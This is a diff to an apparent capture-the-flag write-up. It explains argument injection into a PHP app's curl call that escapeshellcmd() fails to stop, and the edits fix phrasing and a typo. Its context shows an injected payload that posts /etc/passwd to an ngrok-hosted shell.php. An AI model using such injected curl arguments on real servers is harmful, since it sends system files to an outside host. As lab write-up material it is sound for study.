@@ -91,7 +91,7 @@ class CommandModel
 }
 ```
 
-Basically the application will take a user input as a `host` URL to use as a `curl` command argument in `CommandModel.php` to respond the host's content to the client. As they used `escapeshellcmd()` to ensure that user execute only *one command*, we can exploit this using **Argument Injection** technique
+Basically the application will take a user input as a `host` URL argument to pass it to a `curl` command in `CommandModel.php` in order to respond the host's content to the client. As they used `escapeshellcmd()` to ensure that user execute only *one command*, we can exploit this using **Argument Injection** technique
 
 Firstly, I built up a shell to retrieve the exfiltrated file data from the vulnerable server
 
@@ -105,7 +105,7 @@ Then I hosted it using **ngrok** secure tunnel
 
 To bypass the `trycatch` used in the front-end JavaScript file, I simply used BurpSuite to intercept and modify the request
 
-I used this payload to test the file retrieval on `/etc/passwd` and it workded
+I used this payload to test the file retrieval on `/etc/passwd` and it worked
 
 ```
 -F password=@/etc/passwd http://521cc97681d2.ngrok.io/shell.php
